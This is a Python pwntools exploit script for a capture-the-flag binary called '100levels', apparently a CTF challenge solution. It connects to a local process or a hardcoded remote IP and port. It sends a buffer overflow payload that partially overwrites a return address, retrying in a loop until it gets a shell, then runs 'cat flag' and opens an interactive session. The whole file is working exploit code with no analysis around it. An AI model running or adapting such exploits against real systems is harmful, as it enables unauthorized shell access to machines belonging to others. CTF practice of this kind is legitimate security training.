from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./100levels")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./100levels")
else:
	p = remote("111.198.29.45","47292")
	libc = ELF("./libc-2.23.so")
	elf = ELF("./100levels")

def menu(choice):
	p.sendafter("Choice:\n",str(choice))

def hint():
	menu(2)

def exit():
	menu(3)

def go(num1,num2,payload):
	menu(1)
	p.sendafter("How many levels?\n",str(num1))
	p.sendafter("Any more?\n",str(num2))
	p.sendafter("Answer:",payload)

def conn():
	global p
	while True:
		try:
			hint()
			go(0,0,"/bin/sh\x00" +  "a" * 0x28 + "\xe8\xda")
			p.sendline("cat flag")
			info = p.recvline()
			if "{" in info:
				break
		except:
			p.close()
			if debug:
				p = process("./100levels")
			else:
				p = remote("111.198.29.45","47292")

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0xC85),b2 = hex(code_base + 0xF0C)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
conn()
p.interactive()
